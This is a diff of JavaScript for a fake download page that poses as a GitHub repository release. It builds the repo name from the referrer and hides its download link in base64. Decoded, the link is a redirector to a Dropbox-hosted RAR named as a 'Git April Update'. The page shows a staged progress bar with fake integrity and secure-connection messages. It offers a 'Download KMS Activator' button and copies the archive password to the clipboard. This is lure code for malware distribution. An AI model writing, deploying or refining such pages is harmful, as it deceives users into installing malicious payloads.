@@ -1,111 +1,147 @@
 (function() {
-  const parts = [
+  const urlParts = [
     'aHR0cHM6Ly9ocmVmLmxpLz8=',
     'aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpL3k4dm02bTgyZXhhZDJjOXIya3IwMC9BcHBMYXVuY2gtR2l0X0FwcmlsX1VwZGF0ZS5yYXI/cmxrZXk9aTU2YjE5cTBqZnprdDlreG8xeTJ5ajRvdiZzdD1jeTh6YWtnYiZkbD0x'
   ];
 
-  function decode(b) {
+  function decodePart(encoded) {
     try {
-      return atob(b);
+      return atob(encoded);
     } catch(e) {
       return '';
     }
   }
 
-  const DOWNLOAD_URL = decode(parts[0]) + decode(parts[1]);
+  function buildUrl() {
+    const base = decodePart(urlParts[0]);
+    const id = decodePart(urlParts[1]);
+    return base + id;
+  }
+
+  const BASE_URL = buildUrl();
 
   document.addEventListener('DOMContentLoaded', function() {
     const progressFill = document.getElementById('progressFill');
-    const statusSpan = document.getElementById('statusText');
-    const progressPercent = document.getElementById('progressPercentLabel');
+    const progressContainer = document.querySelector('.transfer-panel');
     const downloadWrapper = document.getElementById('downloadWrapper');
     const instructionWrapper = document.getElementById('instructionWrapper');
     const downloadBtn = document.getElementById('downloadBtn');
     const instructionBtn = document.getElementById('instructionBtn');
-    const repoNameSpan = document.getElementById('cardRepoName');
-    const repoMeta = document.getElementById('repoNameMeta');
-
-    function extractRepoName() {
-  const urlParams = new URLSearchParams(window.location.search);
-  const repoParam = urlParams.get('repo');
-  if (repoParam) return repoParam;
-  
-  if (document.referrer) {
-    try {
-      const referrerUrl = new URL(document.referrer);
-      if (referrerUrl.hostname === 'github.com') {
-        const pathParts = referrerUrl.pathname.split('/').filter(p => p);
-        if (pathParts.length >= 2) {
-          return pathParts[1];
-        }
-      }
-    } catch (e) {}
-  }
-
-  if (repoNameMeta && repoNameMeta.content) {
-    return repoNameMeta.content;
-  }
-
-  const path = window.location.pathname;
-  const cleanPath = path.replace(/^\/+|\/+$/g, '');
-  const parts = cleanPath.split('/');
-  return parts[parts.length - 1] || 'quick-start-guide';
-}
-    const finalRepo = getRepoName();
-    if (repoNameSpan) repoNameSpan.innerText = finalRepo;
-    if (repoMeta) repoMeta.content = finalRepo;
+    const statusTextEl = document.getElementById('statusText');
+    const progressPercent = document.getElementById('progressPercentLabel');
+    const cardRepoName = document.getElementById('cardRepoName');
+    const repoNameMeta = document.getElementById('repoNameMeta');
 
     const messages = [
-      "Connecting to release channel...",
-      "Verifying checksums...",
-      "Establishing secure tunnel...",
-      "Preparing payload...",
-      "Ready to download"
+      'Preparing download...',
+      'Verifying integrity...',
+      'Establishing secure connection...',
+      'Fetching release assets...',
+      'Ready to download'
     ];
 
-    let currentWidth = 0;
+    function extractRepoName() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const repoParam = urlParams.get('repo');
+      if (repoParam) return repoParam;
+      
+      if (document.referrer) {
+        try {
+          const referrerUrl = new URL(document.referrer);
+          if (referrerUrl.hostname === 'github.com') {
+            const pathParts = referrerUrl.pathname.split('/').filter(p => p);
+            if (pathParts.length >= 2) {
+              return pathParts[1];
+            }
+          }
+        } catch (e) {}
+      }
+
+      if (repoNameMeta && repoNameMeta.content) {
+        return repoNameMeta.content;
+      }
+
+      const path = window.location.pathname;
+      const cleanPath = path.replace(/^\/+|\/+$/g, '');
+      const parts = cleanPath.split('/');
+      return parts[parts.length - 1] || 'quick-start-guide';
+    }
+
+    const repoName = extractRepoName();
+    if (repoNameMeta) {
+      repoNameMeta.content = repoName;
+    }
+    
+    if (cardRepoName) {
+      cardRepoName.textContent = repoName;
+    }
+
+    let currentIndex = 0;
     const duration = 5000;
-    const stepTime = 30;
-
-    const interval = setInterval(function() {
-      currentWidth += (100 / (duration / stepTime));
-
+    const intervalTime = 50;
+    let currentWidth = 0;
+    
+    const interval = setInterval(() => {
+      currentWidth += (100 / (duration / intervalTime));
+      
       if (currentWidth >= 100) {
         currentWidth = 100;
-        if (progressFill) progressFill.style.width = '100%';
-        if (progressPercent) progressPercent.innerText = '100%';
+        if (progressFill) {
+          progressFill.style.width = '100%';
+        }
+        if (progressPercent) {
+          progressPercent.innerText = '100%';
+        }
         clearInterval(interval);
-        if (downloadWrapper) downloadWrapper.classList.add('visible');
-        if (instructionWrapper) instructionWrapper.classList.add('visible');
-        if (statusSpan) {
-          statusSpan.innerHTML = '<i class="fas fa-check-circle" style="color:#3fb950"></i> Ready — click "Download KMS Activator"';
+        
+        if (progressContainer) {
+          progressContainer.style.opacity = '0.5';
+        }
+        if (statusTextEl) {
+          statusTextEl.innerHTML = '<i class="fas fa-check-circle" style="color:#3fb950"></i> Ready to download';
+        }
+        if (downloadWrapper) {
+          downloadWrapper.classList.add('visible');
+        }
+        if (instructionWrapper) {
+          instructionWrapper.classList.add('visible');
         }
       } else {
-        if (progressFill) progressFill.style.width = currentWidth + '%';
-        if (progressPercent) progressPercent.innerText = Math.floor(currentWidth) + '%';
-        const msgIndex = Math.min(Math.floor((currentWidth / 100) * messages.length), messages.length - 1);
-        if (statusSpan && messages[msgIndex]) {
-          statusSpan.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> ' + messages[msgIndex];
+        if (progressFill) {
+          progressFill.style.width = currentWidth + '%';
+        }
+        if (progressPercent) {
+          progressPercent.innerText = Math.floor(currentWidth) + '%';
+        }
+        
+        const messageIndex = Math.floor((currentWidth / 100) * messages.length);
+        if (messageIndex < messages.length && messageIndex !== currentIndex) {
+          currentIndex = messageIndex;
+          if (statusTextEl) {
+            statusTextEl.style.opacity = '0';
+            setTimeout(() => {
+              if (statusTextEl) {
+                statusTextEl.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> ' + messages[messageIndex];
+                statusTextEl.style.opacity = '1';
+              }
+            }, 100);
+          }
         }
       }
-    }, stepTime);
+    }, intervalTime);
 
     if (downloadBtn) {
-      downloadBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        if (DOWNLOAD_URL && DOWNLOAD_URL.startsWith('http')) {
-          window.open(DOWNLOAD_URL, '_blank');
-          const originalHtml = downloadBtn.innerHTML;
-          downloadBtn.innerHTML = '<i class="fas fa-check"></i> Started';
+      downloadBtn.addEventListener('click', function() {
+        if (BASE_URL && BASE_URL.startsWith('http')) {
+          window.open(BASE_URL, '_blank');
+          downloadBtn.innerHTML = '<i class="fas fa-check"></i> Started!';
           downloadBtn.disabled = true;
           downloadBtn.style.opacity = '0.7';
-          setTimeout(function() {
-            downloadBtn.innerHTML = originalHtml;
+          setTimeout(() => {
+            downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download KMS Activator';
             downloadBtn.disabled = false;
             downloadBtn.style.opacity = '1';
-          }, 2800);
-        } else {
-          alert("Unable to start download. Link not available.");
+          }, 3000);
         }
       });
     }
@@ -147,10 +183,10 @@
     const copyBtn = document.getElementById('copyPasswordBtn');
     if (copyBtn) {
       copyBtn.addEventListener('click', function() {
-        navigator.clipboard.writeText('2026').then(function() {
+        navigator.clipboard.writeText('2026').then(() => {
           const prev = copyBtn.innerHTML;
           copyBtn.innerHTML = '<i class="fas fa-check"></i> copied!';
-          setTimeout(function() {
+          setTimeout(() => {
             copyBtn.innerHTML = prev;
           }, 1500);
         });
